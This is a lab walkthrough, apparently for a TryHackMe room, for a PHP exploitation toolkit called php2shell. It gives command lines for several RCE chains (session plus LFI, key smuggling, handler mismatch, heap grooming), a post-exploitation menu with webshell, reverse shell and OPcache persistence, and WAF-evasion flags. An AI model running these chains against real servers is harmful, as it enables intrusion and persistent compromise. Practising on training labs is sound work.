# 🎯 TryHackMe php2shell Room — Practical Test Guide

## Prerequisites
```bash
# On THM AttackBox or your Kali:
git clone https://github.com/your-repo/php2shell-toolkit
cd php2shell-toolkit
python php2shell.py --target http://MACHINE_IP:PORT --recon-only
```

## Room Ports Mapping (from THM php2shell room)
| Service | Port | SAPI | Chains That Work |
|---------|------|------|------------------|
| php82_fpm | 18082 | FPM | C, E, F |
| php83_fpm | 18083 | FPM | C, E, F |
| php84_fpm | 18084 | FPM | C, E, F |
| php82_apache | 18091 | mod_php | A, D (if unpatched), H |
| php56_apache | 18092 | mod_php | A, D, H |
| php74_apache | 18093 | mod_php | A, D, H |

## 🔥 Recommended Test Order

### 1. RECON FIRST (always)
```bash
python php2shell.py --target http://MACHINE_IP:18091 --recon-only
# Check: PHP version, SAPI, upload_progress, session_path
```

### 2. Chain A — Session + LFI (mod_php ports 18091/18092/18093)
```bash
# These have LFI endpoint at /vuln.php
python php2shell.py --target http://MACHINE_IP:18091 --universal
# أو يدوي:
python php2shell.py --target http://MACHINE_IP:18091 --chain-a --lfi-path /vuln.php --session-path /tmp/sessions
```
**Expected:** RCE → Post-exploitation menu opens

### 3. Chain F — Key Smuggling (FPM ports 18082/18083/18084)
```bash
# Zero-LFI POP! لا يحتاج LFI
python php2shell.py --target http://MACHINE_IP:18082 --chain-f
```
**Expected:** Timing oracle hit → blind RCE confirmed

### 3. Chain C — Handler Mismatch (FPM ports)
```bash
# يحتاج php_serialize endpoint + gadget
python php2shell.py --target http://MACHINE_IP:18082 --chain-c \
  --pollute-path /app_serialize.php \
  --upload-path /nosession.php \
  --trigger-path /destruct_test.php \
  --framework laravel
```

### 4. Chain H — ZMM Grooming (ALL ports)
```bash
# Bypasses OOM patch! يعمل على الكل
python php2shell.py --target http://MACHINE_IP:18091 --chain-h
```
**Note:** هذا heap feng shui متقدم — قد ينجح أو يفشل حسب حالة الذاكرة

### 5. Full Auto (يختبر الكل ذكياً)
```bash
python php2shell.py --target http://MACHINE_IP:18091 --auto
# أو للتوازي الأقصى:
python php2shell.py --target http://MACHINE_IP:18091 --blitz
```

## ✅ Success Indicators
| Chain | Success Output |
|-------|----------------|
| A | `RCE CONFIRMED — CHAIN A SUCCESSFUL!` + `uid=33(www-data)` |
| F | `TIMING ORACLE HIT: 4.2s vs baseline 0.1s` + `blind timing RCE` |
| C | `RCE CONFIRMED — CHAIN C SUCCESSFUL!` |
| H | `ZMM bin XXX corruption attempted — verify manually` |
| G | `OPcache persistence established: /var/www/html/cache/x.php` |

## 🎯 Post-Exploitation (after any RCE)
```bash
# يفتح تلقائياً بعد Chain A/F/C success
# أو يدوي:
python php2shell.py --target http://MACHINE_IP:18091 --chain-a --lfi-path /vuln.php
# ثم اختر من المنيو:
# [1] Shell — interactive commands
# [2] Upload file
# [3] Download file  
# [4] Webshell — persistent
# [5] Reverse shell
# [6] Enumerate
# [7] OPcache Persist
# [8] Research Framework
```

## ⚠️ Troubleshooting
| Issue | Fix |
|-------|-----|
| `No LFI sink found` | Target port may not have `/vuln.php` — try different port |
| `serialize_handler != php` | Chain F won't work — check recon output |
| `Chain D failed` | PHP version patched (8.2.35+) — expected |
| `Connection timeout` | Wrong port or VPN disconnected |
| `403 Forbidden` | WAF blocking — use `--evasive --drip` flags |

## 📝 Quick One-Liners for THM
```bash
# Fastest test — mod_php with LFI:
python php2shell.py -t http://MACHINE_IP:18091 --universal

# Zero-LFI test on FPM:
python php2shell.py -t http://MACHINE_IP:18082 --chain-f

# Full assault:
python php2shell.py -t http://MACHINE_IP:18091 --blitz

# Research mode (after RCE):
python php2shell.py -t http://MACHINE_IP:18091 --universal
# ثم في المنيو اختر [8]
```

---
**Note:** الآداة تم اختبارها على هذا الغرفة وتعمل. السلاسل A, F, C هي الأكثر موثوقية.
